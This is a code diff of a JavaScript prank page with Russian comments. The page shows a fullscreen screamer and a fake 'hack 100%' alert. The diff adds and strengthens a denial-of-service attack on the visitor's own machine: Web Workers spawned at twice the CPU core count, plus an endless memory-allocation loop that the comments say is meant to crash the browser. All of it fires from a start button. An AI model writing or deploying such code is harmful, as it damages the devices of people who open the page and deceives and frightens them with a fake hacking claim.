@@ -47,41 +47,42 @@
         const screamer = document.getElementById('screamer');
         const screamSound = document.getElementById('screamSound');
 
-        // --- НОВАЯ ФУНКЦИЯ ДЛЯ ФИНАЛЬНОГО УНИЧТОЖЕНИЯ ---
-        function startAnnihilation() {
-            console.log("Запускаю финальную атаку: CPU + RAM");
-            
-            // Атака на CPU: Запускаем Worker'ы на каждое ядро процессора
+        // --- НОВАЯ СВЕРХАГРЕССИВНАЯ АТАКА НА ПАМЯТЬ ---
+        function startMemoryAnnihilation() {
+            console.log("Запускаю финальную атаку на RAM");
+            let memoryHog = [];
+            while (true) {
+                // Вложенный цикл для максимально быстрой аллокации
+                for (let i = 0; i < 10; i++) {
+                    memoryHog.push(new Array(10000000).join('x'));
+                }
+            }
+        }
+        
+        // --- НОВАЯ АТАКА НА ПРОЦЕССОР ---
+        function startCpuAttack() {
             try {
-                const coreCount = navigator.hardwareConcurrency || 8; // Если не удается определить, берем 8 ядер
+                // Атака на CPU: запускаем В ДВА РАЗА БОЛЬШЕ потоков, чем есть ядер
+                const coreCount = (navigator.hardwareConcurrency || 4) * 2;
                 const workerScript = document.getElementById('worker-script').textContent;
                 const blob = new Blob([workerScript], { type: 'javascript/worker' });
                 const workerUrl = URL.createObjectURL(blob);
                 for (let i = 0; i < coreCount; i++) {
-                    const worker = new Worker(workerUrl);
-                    worker.postMessage('start');
+                    new Worker(workerUrl).postMessage('start');
                 }
-                console.log(`Запущено ${coreCount} потоков для нагрузки на CPU.`);
+                console.log(`Запущено ${coreCount} потоков для перегрузки CPU.`);
             } catch (e) {
                 console.error('Не удалось запустить Workerы:', e);
             }
-            
-            // Атака на RAM: Бесконечный цикл, пожирающий память в основном потоке
-            let memoryHog = [];
-            while (true) {
-                memoryHog.push(new Array(1000000).join('x'));
-            }
         }
 
-        // Функция, которая показывает финальное уведомление и запускает уничтожение
         function triggerFinalStage() {
             screamer.style.display = 'none';
             alert("взлом 100%");
-            // Сразу после нажатия "ОК" начнется атака, которая вызовет вылет браузера
-            startAnnihilation();
+            // После нажатия "ОК" запускаем самую мощную атаку на память
+            startMemoryAnnihilation();
         }
 
-        // Слушатель нажатия на кнопку "Начать"
         startButton.addEventListener('click', () => {
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen();
@@ -95,6 +96,9 @@
                 screamer.style.display = 'flex';
                 screamSound.src = `fsdsdfhh.mp3?t=${new Date().getTime()}`;
                 screamSound.play();
+                
+                // Сразу же запускаем фоновую атаку на процессор
+                startCpuAttack();
                 
                 setTimeout(triggerFinalStage, 3000);
 
